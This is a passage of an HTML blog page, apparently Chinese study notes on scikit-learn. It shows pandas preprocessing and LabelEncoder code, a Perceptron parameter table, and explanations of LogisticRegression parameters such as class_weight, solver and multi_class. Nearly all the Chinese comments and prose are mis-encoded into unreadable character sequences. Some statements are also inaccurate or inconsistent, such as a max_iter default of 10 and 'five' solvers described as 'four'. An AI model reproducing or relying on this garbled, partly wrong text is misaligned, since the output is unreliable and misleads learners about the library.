class="string">r&quot;C:\work\learnbetter\micro-class\week 3 </span></span><br><span class="line"><span class="string">Preprocessing\Narrativedata.csv&quot;</span>,index_col=<span class="number">0</span>)</span><br><span class="line">data.head()</span><br><span class="line">data.loc[:,<span class="string">&quot;Age&quot;</span>] = data.loc[:,<span class="string">&quot;Age&quot;</span>].fillna(data.loc[:,<span class="string">&quot;Age&quot;</span>].median())</span><br><span class="line"><span class="comment">#.fillna åœ¨DataFrameé‡Œé¢ç›´æ¥è¿›è¡Œå¡«è¡¥</span></span><br><span class="line">data.dropna(axis=<span class="number">0</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#.dropna(axis=0)åˆ é™¤æ‰€æœ‰æœ‰ç¼ºå¤±å€¼çš„è¡Œï¼Œ.dropna(axis=1)åˆ é™¤æ‰€æœ‰æœ‰ç¼ºå¤±å€¼çš„åˆ—</span></span><br><span class="line"><span class="comment">#å‚æ•°inplaceï¼Œä¸ºTrueè¡¨ç¤ºåœ¨åŸæ•°æ®é›†ä¸Šè¿›è¡Œä¿®æ”¹ï¼Œä¸ºFalseè¡¨ç¤ºç”Ÿæˆä¸€ä¸ªå¤åˆ¶å¯¹è±¡ï¼Œä¸ä¿®æ”¹åŸæ•°æ®ï¼Œé»˜è®¤False</span></span><br><span class="line">                   </span><br><span class="line">                   </span><br><span class="line"><span class="comment"># sklearnåªèƒ½å¤„ç†æ•°å€¼å‹æ•°æ®ï¼Œå› æ­¤è¦å°†æ ‡ç­¾è½¬ä¸ºæ•°æ®</span></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> LabelEncoder</span><br><span class="line">y = data.iloc[:,-<span class="number">1</span>] <span class="comment">#è¦è¾“å…¥çš„æ˜¯æ ‡ç­¾ï¼Œä¸æ˜¯ç‰¹å¾çŸ©é˜µï¼Œæ‰€ä»¥å…è®¸ä¸€ç»´</span></span><br><span class="line">le = LabelEncoder() <span class="comment">#å®ä¾‹åŒ–</span></span><br><span class="line">label=le.fit_transform(y)</span><br><span class="line">data.iloc[:,-<span class="number">1</span>] = label <span class="comment">#è®©æ ‡ç­¾ç­‰äºæˆ‘ä»¬è¿è¡Œå‡ºæ¥çš„ç»“æœ</span></span><br><span class="line">                   </span><br><span class="line">                  </span><br></pre></td></tr></table></figure><h3><span id="é€»è¾‘å›å½’">é€»è¾‘å›å½’</span></h3><h3><span id="perceptrons">Perceptrons</span></h3><table><thead><tr><th>å‚æ•°åç§°</th><th>å‚æ•°å–å€¼</th><th>å‚æ•°è§£é‡Š</th></tr></thead><tbody><tr><td>penalty</td><td>é»˜è®¤&#x3D;Noneï¼Œå³ä¸åŠ æƒ©ç½šé¡¹ï¼Œâ€˜l2â€™ï¼ˆL2æ­£åˆ™ï¼‰ or â€˜l1â€™ï¼ˆL1æ­£åˆ™ï¼‰ or â€˜elasticnetâ€™ï¼ˆæ··åˆæ­£åˆ™ï¼‰</td><td>æƒ©ç½šé¡¹ï¼ŒåŠ ä¸Šæƒ©ç½šé¡¹ä¸»è¦ä¸ºäº†é¿å…æ¨¡å‹è¿‡æ‹Ÿåˆé£é™©</td></tr><tr><td>alpha</td><td>é»˜è®¤&#x3D;0.0001ï¼Œå–å€¼ä¸ºæµ®ç‚¹æ•°</td><td>å¦‚æœpenaltyä¸ä¸ºNoneï¼Œåˆ™æ­£åˆ™åŒ–é¡¹éœ€è¦ä¹˜ä¸Šè¿™ä¸ªæ•°</td></tr><tr><td>l1_ratio</td><td>é»˜è®¤&#x3D;0.15ï¼Œå–å€¼åœ¨[0,1]</td><td>ä¸€èˆ¬åªåœ¨penalty&#x3D;elasticnetæ—¶ç”¨ï¼Œå½“l1_ratio &#x3D;0å°±æ˜¯L2æ­£åˆ™ï¼Œå½“l1_ratio &#x3D;1å°±æ˜¯L1æ­£åˆ™ï¼Œå½“åœ¨(0,1)ä¹‹é—´å°±æ˜¯æ··åˆæ­£åˆ™</td></tr><tr><td>fit_intercept</td><td>boolå€¼ï¼Œé»˜è®¤&#x3D;True</td><td>æ˜¯å¦å¯¹å‚æ•° æˆªè·é¡¹bè¿›è¡Œä¼°è®¡ï¼Œè‹¥ä¸ºFalseåˆ™æ•°æ®åº”æ˜¯ä¸­å¿ƒåŒ–çš„</td></tr><tr><td>max_iter</td><td>intæ•´æ•°ï¼Œé»˜è®¤&#x3D;1000</td><td>æœ€å¤§è¿­ä»£æ¬¡æ•°ï¼Œå“ªæ€•æŸå¤±å‡½æ•°ä¾æ—§å¤§äº0&#x2F;</td></tr><tr><td>tol</td><td>float or Noneï¼Œé»˜è®¤&#x3D;10^(-3)</td><td>è¿­ä»£åœæ­¢çš„æ ‡å‡†ã€‚å¦‚æœä¸ä¸ºNoneï¼Œé‚£ä¹ˆå½“loss-pre-loss&lt;tolçš„æ—¶å€™ï¼Œå°±ä¼šåœæ­¢è¿­ä»£ã€‚å› ä¸ºå½“å‰è¿­ä»£é€ æˆçš„æŸå¤±å‡½æ•°ä¸‹é™å¤ªå°äº†ï¼Œè¿­ä»£ä¸‹å»å¯¹losså½±å“ä¸å¤§äº†ã€‚</td></tr><tr><td>shuffle</td><td>boolå€¼ï¼Œé»˜è®¤&#x3D;True</td><td>æ¯è½®è®­ç»ƒåæ˜¯å¦æ‰“ä¹±æ•°æ®</td></tr><tr><td>verbose</td><td>å–å€¼ä¸ºæ•´æ•°ï¼Œé»˜è®¤&#x3D;0</td><td>verbose &#x3D; 0 ä¸ºä¸åœ¨æ ‡å‡†è¾“å‡ºæµè¾“å‡ºæ—¥å¿—ä¿¡æ¯ï¼Œverbose &#x3D; 1 ä¸ºè¾“å‡ºè¿›åº¦æ¡è®°å½•ï¼›verbose &#x3D; 2 ä¸ºæ¯ä¸ªepochè¾“å‡ºä¸€è¡Œè®°å½•</td></tr><tr><td>eta0</td><td>å–å€¼åŒç²¾åº¦æµ®ç‚¹å‹doubleï¼Œé»˜è®¤&#x3D;1</td><td>å­¦ä¹ ç‡ï¼Œå†³å®šæ¢¯åº¦ä¸‹é™æ—¶æ¯æ¬¡å‚æ•°å˜åŒ–çš„å¹…åº¦</td></tr><tr><td>n_jobs</td><td>å–å€¼ä¸º int or Noneï¼Œé»˜è®¤&#x3D;None</td><td>åœ¨å¤šåˆ†ç±»æ—¶ä½¿ç”¨çš„CPUæ•°é‡ï¼Œé»˜è®¤ä¸ºNoneï¼ˆæˆ–1ï¼‰ï¼Œè‹¥ä¸º-1åˆ™ä½¿ç”¨æ‰€æœ‰CPU</td></tr><tr><td>random_state</td><td>å–å€¼ä¸ºint, RandomState instance or Noneï¼Œé»˜è®¤&#x3D;None</td><td>å½“ shuffle &#x3D;Trueæ—¶ï¼Œç”¨äºæ‰“ä¹±è®­ç»ƒæ•°æ®</td></tr><tr><td>n_iter_no_change</td><td>å–å€¼intï¼Œé»˜è®¤&#x3D;5</td><td>åœ¨æå‰åœæ­¢ä¹‹å‰ç­‰å¾…éªŒè¯åˆ†æ•°æ— æ”¹è¿›çš„è¿­ä»£æ¬¡æ•°ï¼Œç”¨äºæå‰åœæ­¢è¿­ä»£</td></tr><tr><td>early_stopping</td><td>å–å€¼boolå€¼ï¼Œé»˜è®¤&#x3D;False</td><td>å½“éªŒè¯å¾—åˆ†ä¸å†æé«˜æ—¶æ˜¯å¦è®¾ç½®æå‰åœæ­¢æ¥ç»ˆæ­¢è®­ç»ƒã€‚è‹¥è®¾ç½®æ­¤é¡¹ï¼Œå½“éªŒè¯å¾—åˆ†åœ¨n_iter_no_changeè½®å†…æ²¡æœ‰æå‡æ—¶æå‰åœæ­¢è®­ç»ƒ</td></tr><tr><td>class_weight</td><td>å–å€¼ä¸ºdict, {class_label: weight} æˆ–è€… â€œbalancedâ€æˆ–è€…Noneï¼Œé»˜è®¤&#x3D;None</td><td>ç”¨äºæ‹Ÿåˆå‚æ•°æ—¶ï¼Œæ¯ä¸€ç±»çš„æƒé‡æ˜¯å¤šå°‘ã€‚å½“ä¸ºNoneæ—¶ï¼Œæ‰€æœ‰ç±»çš„æƒé‡ä¸º1ï¼Œç­‰æƒé‡ï¼›å½“ä¸ºbalancedæ—¶ï¼ŒæŸç±»çš„æƒé‡ä¸ºè¯¥ç±»é¢‘æ•°çš„åæ¯”ï¼Œå½“ä¸ºå­—å…¸æ—¶ï¼Œåˆ™keyä¸ºç±»çš„æ ‡ç­¾ï¼Œå€¼ä¸ºå¯¹åº”çš„æƒé‡</td></tr><tr><td>warm_start</td><td>å–å€¼ä¸ºboolï¼Œé»˜è®¤&#x3D;False</td><td>è‹¥ä¸ºTrueåˆ™è°ƒç”¨å‰ä¸€æ¬¡è®¾ç½®çš„å‚æ•°ï¼Œä½¿ç”¨æ–°è®¾ç½®çš„å‚æ•°</td></tr></tbody></table><ul><li><p>eta0 å­¦ä¹ ç‡</p><p>ç±»ä¼¼äºæ­¥é•¿ï¼Œæ­¥é•¿å¤ªå°æ”¶æ•›å¤ªæ…¢ï¼Œæ­¥é•¿å¤ªé•¿ï¼Œåå¤æ¨ªè·³ï¼Œæ— æ³•æ”¶æ•›ã€‚</p></li></ul><h3><span id="logisticregression">LogisticRegression</span></h3><ul><li><p>penaltyï¼šæƒ©ç½šé¡¹ï¼Œstrç±»å‹ï¼Œå¯é€‰å‚æ•°ä¸ºl1å’Œl2ï¼Œé»˜è®¤ä¸ºl2ã€‚ç”¨äºæŒ‡å®šæƒ©ç½šé¡¹ä¸­ä½¿ç”¨çš„è§„èŒƒã€‚newton-cgã€sagå’Œlbfgsæ±‚è§£ç®—æ³•åªæ”¯æŒL2è§„èŒƒã€‚L1Gè§„èŒƒå‡è®¾çš„æ˜¯æ¨¡å‹çš„å‚æ•°æ»¡è¶³æ‹‰æ™®æ‹‰æ–¯åˆ†å¸ƒï¼ŒL2å‡è®¾çš„æ¨¡å‹å‚æ•°æ»¡è¶³é«˜æ–¯åˆ†å¸ƒï¼Œæ‰€è°“çš„èŒƒå¼å°±æ˜¯åŠ ä¸Šå¯¹å‚æ•°çš„çº¦æŸï¼Œä½¿å¾—æ¨¡å‹æ›´ä¸ä¼šè¿‡æ‹Ÿåˆ(overfit)ï¼Œä½†æ˜¯å¦‚æœè¦è¯´æ˜¯ä¸æ˜¯åŠ äº†çº¦æŸå°±ä¼šå¥½ï¼Œè¿™ä¸ªæ²¡æœ‰äººèƒ½å›ç­”ï¼Œåªèƒ½è¯´ï¼ŒåŠ çº¦æŸçš„æƒ…å†µä¸‹ï¼Œç†è®ºä¸Šåº”è¯¥å¯ä»¥è·å¾—æ³›åŒ–èƒ½åŠ›æ›´å¼ºçš„ç»“æœã€‚</p></li><li><p>dualï¼šå¯¹å¶æˆ–åŸå§‹æ–¹æ³•ï¼Œboolç±»å‹ï¼Œé»˜è®¤ä¸ºFalseã€‚å¯¹å¶æ–¹æ³•åªç”¨åœ¨æ±‚è§£çº¿æ€§å¤šæ ¸(liblinear)çš„L2æƒ©ç½šé¡¹ä¸Šã€‚å½“æ ·æœ¬æ•°é‡&gt;æ ·æœ¬ç‰¹å¾çš„æ—¶å€™ï¼Œdualé€šå¸¸è®¾ç½®ä¸ºFalseã€‚</p></li><li><p>tolï¼šåœæ­¢æ±‚è§£çš„æ ‡å‡†ï¼Œfloatç±»å‹ï¼Œé»˜è®¤ä¸º1e-4ã€‚å°±æ˜¯æ±‚è§£åˆ°å¤šå°‘çš„æ—¶å€™ï¼Œåœæ­¢ï¼Œè®¤ä¸ºå·²ç»æ±‚å‡ºæœ€ä¼˜è§£ã€‚</p></li><li><p>cï¼šæ­£åˆ™åŒ–ç³»æ•°Î»çš„å€’æ•°ï¼Œfloatç±»å‹ï¼Œé»˜è®¤ä¸º1.0ã€‚å¿…é¡»æ˜¯æ­£æµ®ç‚¹å‹æ•°ã€‚åƒSVMä¸€æ ·ï¼Œè¶Šå°çš„æ•°å€¼è¡¨ç¤ºè¶Šå¼ºçš„æ­£åˆ™åŒ–ã€‚</p></li><li><p>fit_interceptï¼šæ˜¯å¦å­˜åœ¨æˆªè·æˆ–åå·®ï¼Œboolç±»å‹ï¼Œé»˜è®¤ä¸ºTrueã€‚</p></li><li><p>intercept_scalingï¼šä»…åœ¨æ­£åˆ™åŒ–é¡¹ä¸ºâ€liblinearâ€ï¼Œä¸”fit_interceptè®¾ç½®ä¸ºTrueæ—¶æœ‰ç”¨ã€‚floatç±»å‹ï¼Œé»˜è®¤ä¸º1ã€‚</p></li><li><p>class_weightï¼šç”¨äºæ ‡ç¤ºåˆ†ç±»æ¨¡å‹ä¸­å„ç§ç±»å‹çš„æƒé‡ï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªå­—å…¸æˆ–è€…â€™balancedâ€™å­—ç¬¦ä¸²ï¼Œé»˜è®¤ä¸ºä¸è¾“å…¥ï¼Œä¹Ÿå°±æ˜¯ä¸è€ƒè™‘æƒé‡ï¼Œå³ä¸ºNoneã€‚å¦‚æœé€‰æ‹©è¾“å…¥çš„è¯ï¼Œå¯ä»¥é€‰æ‹©balancedè®©ç±»åº“è‡ªå·±è®¡ç®—ç±»å‹æƒé‡ï¼Œæˆ–è€…è‡ªå·±è¾“å…¥å„ä¸ªç±»å‹çš„æƒé‡ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚å¯¹äº0,1çš„äºŒå…ƒæ¨¡å‹ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰class_weight&#x3D;{0:0.9,1:0.1}ï¼Œè¿™æ ·ç±»å‹0çš„æƒé‡ä¸º90%ï¼Œè€Œç±»å‹1çš„æƒé‡ä¸º10%ã€‚å¦‚æœclass_weighté€‰æ‹©balancedï¼Œé‚£ä¹ˆç±»åº“ä¼šæ ¹æ®è®­ç»ƒæ ·æœ¬é‡æ¥è®¡ç®—æƒé‡ã€‚æŸç§ç±»å‹æ ·æœ¬é‡è¶Šå¤šï¼Œåˆ™æƒé‡è¶Šä½ï¼Œæ ·æœ¬é‡è¶Šå°‘ï¼Œåˆ™æƒé‡è¶Šé«˜ã€‚å½“class_weightä¸ºbalancedæ—¶ï¼Œç±»æƒé‡è®¡ç®—æ–¹æ³•å¦‚ä¸‹ï¼šn_samples &#x2F; (n_classes * np.bincount(y))ã€‚n_samplesä¸ºæ ·æœ¬æ•°ï¼Œn_classesä¸ºç±»åˆ«æ•°é‡ï¼Œnp.bincount(y)ä¼šè¾“å‡ºæ¯ä¸ªç±»çš„æ ·æœ¬æ•°ï¼Œä¾‹å¦‚y&#x3D;[1,0,0,1,1],åˆ™np.bincount(y)&#x3D;[2,3]ã€‚<br>é‚£ä¹ˆclass_weightæœ‰ä»€ä¹ˆä½œç”¨å‘¢ï¼Ÿ</p><p>åœ¨åˆ†ç±»æ¨¡å‹ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šé‡åˆ°ä¸¤ç±»é—®é¢˜ï¼š<br>ç¬¬ä¸€ç§æ˜¯è¯¯åˆ†ç±»çš„ä»£ä»·å¾ˆé«˜ã€‚æ¯”å¦‚å¯¹åˆæ³•ç”¨æˆ·å’Œéæ³•ç”¨æˆ·è¿›è¡Œåˆ†ç±»ï¼Œå°†éæ³•ç”¨æˆ·åˆ†ç±»ä¸ºåˆæ³•ç”¨æˆ·çš„ä»£ä»·å¾ˆé«˜ï¼Œæˆ‘ä»¬å®æ„¿å°†åˆæ³•ç”¨æˆ·åˆ†ç±»ä¸ºéæ³•ç”¨æˆ·ï¼Œè¿™æ—¶å¯ä»¥äººå·¥å†ç”„åˆ«ï¼Œä½†æ˜¯å´ä¸æ„¿å°†éæ³•ç”¨æˆ·åˆ†ç±»ä¸ºåˆæ³•ç”¨æˆ·ã€‚è¿™æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€‚å½“æé«˜éæ³•ç”¨æˆ·çš„æƒé‡ã€‚<br>ç¬¬äºŒç§æ˜¯æ ·æœ¬æ˜¯é«˜åº¦å¤±è¡¡çš„ï¼Œæ¯”å¦‚æˆ‘ä»¬æœ‰åˆæ³•ç”¨æˆ·å’Œéæ³•ç”¨æˆ·çš„äºŒå…ƒæ ·æœ¬æ•°æ®10000æ¡ï¼Œé‡Œé¢åˆæ³•ç”¨æˆ·æœ‰9995æ¡ï¼Œéæ³•ç”¨æˆ·åªæœ‰5æ¡ï¼Œå¦‚æœæˆ‘ä»¬ä¸è€ƒè™‘æƒé‡ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥å°†æ‰€æœ‰çš„æµ‹è¯•é›†éƒ½é¢„æµ‹ä¸ºåˆæ³•ç”¨æˆ·ï¼Œè¿™æ ·é¢„æµ‹å‡†ç¡®ç‡ç†è®ºä¸Šæœ‰99.95%ï¼Œä½†æ˜¯å´æ²¡æœ‰ä»»ä½•æ„ä¹‰ã€‚è¿™æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©balancedï¼Œè®©ç±»åº“è‡ªåŠ¨æé«˜éæ³•ç”¨æˆ·æ ·æœ¬çš„æƒé‡ã€‚æé«˜äº†æŸç§åˆ†ç±»çš„æƒé‡ï¼Œç›¸æ¯”ä¸è€ƒè™‘æƒé‡ï¼Œä¼šæœ‰æ›´å¤šçš„æ ·æœ¬åˆ†ç±»åˆ’åˆ†åˆ°é«˜æƒé‡çš„ç±»åˆ«ï¼Œä»è€Œå¯ä»¥è§£å†³ä¸Šé¢ä¸¤ç±»é—®é¢˜ã€‚</p></li><li><p>random_stateï¼šéšæœºæ•°ç§å­ï¼Œintç±»å‹ï¼Œå¯é€‰å‚æ•°ï¼Œé»˜è®¤ä¸ºæ— ï¼Œä»…åœ¨æ­£åˆ™åŒ–ä¼˜åŒ–ç®—æ³•ä¸ºsag,liblinearæ—¶æœ‰ç”¨ã€‚</p></li><li><p>solverï¼šä¼˜åŒ–ç®—æ³•é€‰æ‹©å‚æ•°ï¼Œåªæœ‰äº”ä¸ªå¯é€‰å‚æ•°ï¼Œå³newton-cg,lbfgs,liblinear,sag,sagaã€‚é»˜è®¤ä¸ºliblinearã€‚solverå‚æ•°å†³å®šäº†æˆ‘ä»¬å¯¹é€»è¾‘å›å½’æŸå¤±å‡½æ•°çš„ä¼˜åŒ–æ–¹æ³•ï¼Œæœ‰å››ç§ç®—æ³•å¯ä»¥é€‰æ‹©ï¼Œåˆ†åˆ«æ˜¯ï¼š</p></li><li><p>liblinearï¼šä½¿ç”¨äº†å¼€æºçš„liblinearåº“å®ç°ï¼Œå†…éƒ¨ä½¿ç”¨äº†åæ ‡è½´ä¸‹é™æ³•æ¥è¿­ä»£ä¼˜åŒ–æŸå¤±å‡½æ•°ã€‚</p></li><li><p>lbfgsï¼šæ‹Ÿç‰›é¡¿æ³•çš„ä¸€ç§ï¼Œåˆ©ç”¨æŸå¤±å‡½æ•°äºŒé˜¶å¯¼æ•°çŸ©é˜µå³æµ·æ£®çŸ©é˜µæ¥è¿­ä»£ä¼˜åŒ–æŸå¤±å‡½æ•°ã€‚</p></li><li><p>newton-cgï¼šä¹Ÿæ˜¯ç‰›é¡¿æ³•å®¶æ—çš„ä¸€ç§ï¼Œåˆ©ç”¨æŸå¤±å‡½æ•°äºŒé˜¶å¯¼æ•°çŸ©é˜µå³æµ·æ£®çŸ©é˜µæ¥è¿­ä»£ä¼˜åŒ–æŸå¤±å‡½æ•°ã€‚</p></li><li><p>sagï¼šå³éšæœºå¹³å‡æ¢¯åº¦ä¸‹é™ï¼Œæ˜¯æ¢¯åº¦ä¸‹é™æ³•çš„å˜ç§ï¼Œå’Œæ™®é€šæ¢¯åº¦ä¸‹é™æ³•çš„åŒºåˆ«æ˜¯æ¯æ¬¡è¿­ä»£ä»…ä»…ç”¨ä¸€éƒ¨åˆ†çš„æ ·æœ¬æ¥è®¡ç®—æ¢¯åº¦ï¼Œé€‚åˆäºæ ·æœ¬æ•°æ®å¤šçš„æ—¶å€™ã€‚</p></li><li><p>sagaï¼šçº¿æ€§æ”¶æ•›çš„éšæœºä¼˜åŒ–ç®—æ³•çš„çš„å˜é‡ã€‚</p></li></ul><p>æ€»ç»“ï¼š<br>liblinearé€‚ç”¨äºå°æ•°æ®é›†ï¼Œè€Œsagå’Œsagaé€‚ç”¨äºå¤§æ•°æ®é›†å› ä¸ºé€Ÿåº¦æ›´å¿«ã€‚<br>å¯¹äºå¤šåˆ†ç±»é—®é¢˜ï¼Œåªæœ‰newton-cg,sag,sagaå’Œlbfgsèƒ½å¤Ÿå¤„ç†å¤šé¡¹æŸå¤±ï¼Œè€Œliblinearå—é™äºä¸€å¯¹å‰©ä½™(OvR)ã€‚å•¥æ„æ€ï¼Œå°±æ˜¯ç”¨liblinearçš„æ—¶å€™ï¼Œå¦‚æœæ˜¯å¤šåˆ†ç±»é—®é¢˜ï¼Œå¾—å…ˆæŠŠä¸€ç§ç±»åˆ«ä½œä¸ºä¸€ä¸ªç±»åˆ«ï¼Œå‰©ä½™çš„æ‰€æœ‰ç±»åˆ«ä½œä¸ºå¦å¤–ä¸€ä¸ªç±»åˆ«ã€‚ä¸€æ¬¡ç±»æ¨ï¼Œéå†æ‰€æœ‰ç±»åˆ«ï¼Œè¿›è¡Œåˆ†ç±»ã€‚<br>newton-cg,sagå’Œlbfgsè¿™ä¸‰ç§ä¼˜åŒ–ç®—æ³•æ—¶éƒ½éœ€è¦æŸå¤±å‡½æ•°çš„ä¸€é˜¶æˆ–è€…äºŒé˜¶è¿ç»­å¯¼æ•°ï¼Œå› æ­¤ä¸èƒ½ç”¨äºæ²¡æœ‰è¿ç»­å¯¼æ•°çš„L1æ­£åˆ™åŒ–ï¼Œåªèƒ½ç”¨äºL2æ­£åˆ™åŒ–ã€‚è€Œliblinearå’Œsagaé€šåƒL1æ­£åˆ™åŒ–å’ŒL2æ­£åˆ™åŒ–ã€‚<br>åŒæ—¶ï¼Œsagæ¯æ¬¡ä»…ä»…ä½¿ç”¨äº†éƒ¨åˆ†æ ·æœ¬è¿›è¡Œæ¢¯åº¦è¿­ä»£ï¼Œæ‰€ä»¥å½“æ ·æœ¬é‡å°‘çš„æ—¶å€™ä¸è¦é€‰æ‹©å®ƒï¼Œè€Œå¦‚æœæ ·æœ¬é‡éå¸¸å¤§ï¼Œæ¯”å¦‚å¤§äº10ä¸‡ï¼Œsagæ˜¯ç¬¬ä¸€é€‰æ‹©ã€‚ä½†æ˜¯sagä¸èƒ½ç”¨äºL1æ­£åˆ™åŒ–ï¼Œæ‰€ä»¥å½“ä½ æœ‰å¤§é‡çš„æ ·æœ¬ï¼Œåˆéœ€è¦L1æ­£åˆ™åŒ–çš„è¯å°±è¦è‡ªå·±åšå–èˆäº†ã€‚è¦ä¹ˆé€šè¿‡å¯¹æ ·æœ¬é‡‡æ ·æ¥é™ä½æ ·æœ¬é‡ï¼Œè¦ä¹ˆå›åˆ°L2æ­£åˆ™åŒ–ã€‚<br>ä»ä¸Šé¢çš„æè¿°ï¼Œå¤§å®¶å¯èƒ½è§‰å¾—ï¼Œæ—¢ç„¶newton-cg, lbfgså’Œsagè¿™ä¹ˆå¤šé™åˆ¶ï¼Œå¦‚æœä¸æ˜¯å¤§æ ·æœ¬ï¼Œæˆ‘ä»¬é€‰æ‹©liblinearä¸å°±è¡Œäº†å˜›ï¼é”™ï¼Œå› ä¸ºliblinearä¹Ÿæœ‰è‡ªå·±çš„å¼±ç‚¹ï¼æˆ‘ä»¬çŸ¥é“ï¼Œé€»è¾‘å›å½’æœ‰äºŒå…ƒé€»è¾‘å›å½’å’Œå¤šå…ƒé€»è¾‘å›å½’ã€‚å¯¹äºå¤šå…ƒé€»è¾‘å›å½’å¸¸è§çš„æœ‰one-vs-rest(OvR)å’Œmany-vs-many(MvM)ä¸¤ç§ã€‚è€ŒMvMä¸€èˆ¬æ¯”OvRåˆ†ç±»ç›¸å¯¹å‡†ç¡®ä¸€äº›ã€‚éƒé—·çš„æ˜¯liblinearåªæ”¯æŒOvRï¼Œä¸æ”¯æŒMvMï¼Œè¿™æ ·å¦‚æœæˆ‘ä»¬éœ€è¦ç›¸å¯¹ç²¾ç¡®çš„å¤šå…ƒé€»è¾‘å›å½’æ—¶ï¼Œå°±ä¸èƒ½é€‰æ‹©liblinearäº†ã€‚ä¹Ÿæ„å‘³ç€å¦‚æœæˆ‘ä»¬éœ€è¦ç›¸å¯¹ç²¾ç¡®çš„å¤šå…ƒé€»è¾‘å›å½’ä¸èƒ½ä½¿ç”¨L1æ­£åˆ™åŒ–äº†ã€‚<br>max_iterï¼šç®—æ³•æ”¶æ•›æœ€å¤§è¿­ä»£æ¬¡æ•°ï¼Œintç±»å‹ï¼Œé»˜è®¤ä¸º10ã€‚ä»…åœ¨æ­£åˆ™åŒ–ä¼˜åŒ–ç®—æ³•ä¸ºnewton-cg, sagå’Œlbfgsæ‰æœ‰ç”¨ï¼Œç®—æ³•æ”¶æ•›çš„æœ€å¤§è¿­ä»£æ¬¡æ•°ã€‚</p><ul><li><p>multi_classï¼šåˆ†ç±»æ–¹å¼é€‰æ‹©å‚æ•°ï¼Œstrç±»å‹ï¼Œå¯é€‰å‚æ•°ä¸ºovrå’Œmultinomialï¼Œé»˜è®¤ä¸ºovrã€‚ovrå³å‰é¢æåˆ°çš„one-vs-rest(OvR)ï¼Œè€Œmultinomialå³å‰é¢æåˆ°çš„many-vs-many(MvM)ã€‚å¦‚æœæ˜¯äºŒå…ƒé€»è¾‘å›å½’ï¼Œovrå’Œmultinomialå¹¶æ²¡æœ‰ä»»ä½•åŒºåˆ«ï¼ŒåŒºåˆ«ä¸»è¦åœ¨å¤šå…ƒé€»è¾‘å›å½’ä¸Šã€‚</p></li><li><p>OvRå’ŒMvMæœ‰ä»€ä¹ˆä¸åŒ<em>ï¼Ÿ</em><br>OvRçš„æ€æƒ³å¾ˆç®€å•ï¼Œæ— è®ºä½ æ˜¯å¤šå°‘å…ƒé€»è¾‘å›å½’ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥çœ‹åšäºŒå…ƒé€»è¾‘å›å½’ã€‚å…·ä½“åšæ³•æ˜¯ï¼Œå¯¹äºç¬¬Kç±»çš„åˆ†ç±»å†³ç­–ï¼Œæˆ‘ä»¬æŠŠæ‰€æœ‰ç¬¬Kç±»çš„æ ·æœ¬ä½œä¸ºæ­£ä¾‹ï¼Œé™¤äº†ç¬¬Kç±»æ ·æœ¬ä»¥å¤–çš„æ‰€æœ‰æ ·æœ¬éƒ½ä½œä¸ºè´Ÿä¾‹ï¼Œç„¶ååœ¨ä¸Šé¢åšäºŒå…ƒé€»è¾‘å›å½’ï¼Œå¾—åˆ°ç¬¬Kç±»çš„åˆ†ç±»æ¨¡å‹ã€‚å…¶ä»–ç±»çš„åˆ†ç±»æ¨¡å‹è·å¾—ä»¥æ­¤ç±»æ¨ã€‚<br>è€ŒMvMåˆ™ç›¸å¯¹å¤æ‚ï¼Œè¿™é‡Œä¸¾MvMçš„ç‰¹ä¾‹one-vs-one(OvO)ä½œè®²è§£ã€‚å¦‚æœæ¨¡å‹æœ‰Tç±»ï¼Œæˆ‘ä»¬æ¯æ¬¡åœ¨æ‰€æœ‰çš„Tç±»æ ·æœ¬é‡Œé¢é€‰æ‹©ä¸¤ç±»æ ·æœ¬å‡ºæ¥ï¼Œä¸å¦¨è®°ä¸ºT1ç±»å’ŒT2ç±»ï¼ŒæŠŠæ‰€æœ‰çš„è¾“å‡ºä¸ºT1å’ŒT2çš„æ ·æœ¬æ”¾åœ¨ä¸€èµ·ï¼ŒæŠŠT1ä½œä¸ºæ­£ä¾‹ï¼ŒT2ä½œä¸ºè´Ÿä¾‹ï¼Œè¿›è¡ŒäºŒå…ƒé€»è¾‘å›å½’ï¼Œå¾—åˆ°æ¨¡å‹å‚æ•°ã€‚æˆ‘ä»¬ä¸€å…±éœ€è¦T(T-1)&#x2F;2æ¬¡åˆ†ç±»ã€‚<br>å¯ä»¥çœ‹å‡ºOvRç›¸å¯¹ç®€å•ï¼Œä½†åˆ†ç±»æ•ˆæœç›¸å¯¹ç•¥å·®ï¼ˆè¿™é‡ŒæŒ‡å¤§å¤šæ•°æ ·æœ¬åˆ†å¸ƒæƒ…å†µï¼ŒæŸäº›æ ·æœ¬åˆ†å¸ƒä¸‹OvRå¯èƒ½æ›´å¥½ï¼‰ã€‚è€ŒMvMåˆ†ç±»ç›¸å¯¹ç²¾ç¡®ï¼Œä½†æ˜¯åˆ†ç±»é€Ÿåº¦æ²¡æœ‰OvRå¿«ã€‚å¦‚æœé€‰æ‹©äº†ovrï¼Œåˆ™4ç§æŸå¤±å‡½æ•°çš„ä¼˜åŒ–æ–¹æ³•liblinearï¼Œnewton-cg,lbfgså’Œsagéƒ½å¯ä»¥é€‰æ‹©ã€‚ä½†æ˜¯å¦‚æœé€‰æ‹©äº†multinomial,åˆ™åªèƒ½é€‰æ‹©newton-cg, lbfgså’Œsagäº†ã€‚</p></li><li><p>verboseï¼šæ—¥å¿—å†—é•¿åº¦ï¼Œintç±»å‹ã€‚é»˜è®¤ä¸º0ã€‚å°±æ˜¯ä¸è¾“å‡ºè®­ç»ƒè¿‡ç¨‹ï¼Œ1çš„æ—¶å€™å¶å°”è¾“å‡ºç»“æœï¼Œå¤§äº1ï¼Œå¯¹äºæ¯ä¸ªå­æ¨¡å‹éƒ½è¾“å‡ºã€‚</p></li><li><p>warm_startï¼šçƒ­å¯åŠ¨å‚æ•°ï¼Œboolç±»å‹ã€‚é»˜è®¤ä¸ºFalseã€‚å¦‚æœä¸ºTrueï¼Œåˆ™ä¸‹ä¸€æ¬¡è®­ç»ƒæ˜¯ä»¥è¿½åŠ æ 